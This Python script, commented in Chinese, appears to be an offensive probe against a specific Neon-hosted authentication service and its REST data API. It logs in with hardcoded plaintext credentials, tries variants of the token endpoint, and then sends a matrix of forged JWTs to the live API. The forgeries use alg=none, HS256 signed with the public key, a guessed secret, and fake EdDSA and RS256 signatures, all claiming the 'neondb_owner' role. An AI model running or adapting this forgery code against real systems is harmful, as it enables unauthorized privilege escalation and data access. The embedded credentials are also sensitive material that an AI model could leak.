# -*- coding: utf-8 -*-
"""auth/token 深挖 + kid/alg 伪造矩阵修复"""
import http.client, ssl, json, time, base64, hmac, hashlib

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
DA_HOST = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
DA_BASE = '/neondb/rest/v1'
EMAIL = 'libobo1229+na2@gmail.com'
PWD = 'SecTest!2026pass2'
KID = '6ab964bf-eee3-4249-bac3-85adf9d5faee'
KEY_X = 'T2bvRniQ-dVtriL1EY22pby24AQVsi22hGWV8i4aYtY'

def req(host, method, path, body=None, token=None, headers=None, origin=None, cookie=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if origin:
        h['Origin'] = origin
    if token:
        h['Authorization'] = 'Bearer ' + token
    if cookie:
        h['Cookie'] = cookie
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    cookies = r.headers.get_all('Set-Cookie') if r.headers else None
    conn.close()
    return st, raw, cookies

# 登录拿 session + cookie
st, raw, cookies = req(NA, 'POST', '/neondb/auth/sign-in/email', {'email': EMAIL, 'password': PWD}, origin='http://localhost:3000')
sess_tok = json.loads(raw).get('token')
cookie_str_full = '; '.join(c.split(';')[0] for c in cookies) if cookies else ''
print('[sign-in] %d token=%s...' % (st, sess_tok[:20] if sess_tok else None))

print('\n=== auth/token 端点变体 ===')
for method, path, body, extra in [
    ('POST', '/neondb/auth/token', {}, {}),
    ('POST', '/neondb/auth/token', {'token': sess_tok}, {}),
    ('POST', '/neondb/auth/token', {}, {'cookie': cookie_str_full}),
    ('GET', '/neondb/auth/token', None, {'cookie': cookie_str_full}),
    ('POST', '/neondb/auth/token', {'grant_type': 'session'}, {}),
]:
    st, raw, _ = req(NA, method, path, body=body, token=sess_tok, origin='http://localhost:3000', cookie=extra.get('cookie'))
    print('  %s %s -> %d | %s' % (method, path, st, raw.decode(errors='replace')[:200]))
    time.sleep(0.3)

print('\n=== kid/alg 伪造矩阵 ===')
now = int(time.time())
def b64e(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

pl = {'role': 'neondb_owner', 'exp': now + 3600, 'iat': now, 'sub': '8e3f631f-3ec6-4d71-b580-195b52a30ab3',
      'email': EMAIL, 'aud': 'neon_auth'}

def try_jwt(tag, header, payload, sig):
    h = b64e(json.dumps(header).encode())
    p = b64e(json.dumps(payload).encode())
    msg = (h + '.' + p).encode()
    if sig is None:
        tok = h + '.' + p + '.'
    elif callable(sig):
        tok = h + '.' + p + '.' + b64e(sig(msg))
    else:
        tok = h + '.' + p + '.' + b64e(sig)
    st, raw, _ = req(DA_HOST, 'GET', DA_BASE + '/', token=tok)
    print('  [%s] -> %d | %s' % (tag, st, raw.decode(errors='replace')[:150]))

key_raw = base64.urlsafe_b64decode(KEY_X + '=' * (-len(KEY_X) % 4))
# Ed25519 签名需要私钥,这里用假签名看错误; HMAC 用各种 key 变体
try_jwt('EdDSA真kid 随机签名', {'alg': 'EdDSA', 'kid': KID, 'typ': 'JWT'}, pl, b'F' * 64)
try_jwt('none带kid', {'alg': 'none', 'kid': KID, 'typ': 'JWT'}, pl, None)
try_jwt('HS256 kid=x字符串', {'alg': 'HS256', 'kid': KID, 'typ': 'JWT'}, pl,
        lambda m: hmac.new(KEY_X.encode(), m, hashlib.sha256).digest())
try_jwt('HS256 kid=x原始字节', {'alg': 'HS256', 'kid': KID, 'typ': 'JWT'}, pl,
        lambda m: hmac.new(key_raw, m, hashlib.sha256).digest())
try_jwt('HS256 kid=真实kid值', {'alg': 'HS256', 'kid': KID, 'typ': 'JWT'}, pl,
        lambda m: hmac.new(KID.encode(), m, hashlib.sha256).digest())
try_jwt('HS256 无kid', {'alg': 'HS256', 'typ': 'JWT'}, pl,
        lambda m: hmac.new(b'secret', m, hashlib.sha256).digest())
try_jwt('RS256 kid=x(公钥当PEM)', {'alg': 'RS256', 'kid': KID, 'typ': 'JWT'}, pl, b'G' * 256)
try_jwt('EdDSA 无kid', {'alg': 'EdDSA', 'typ': 'JWT'}, pl, b'F' * 64)
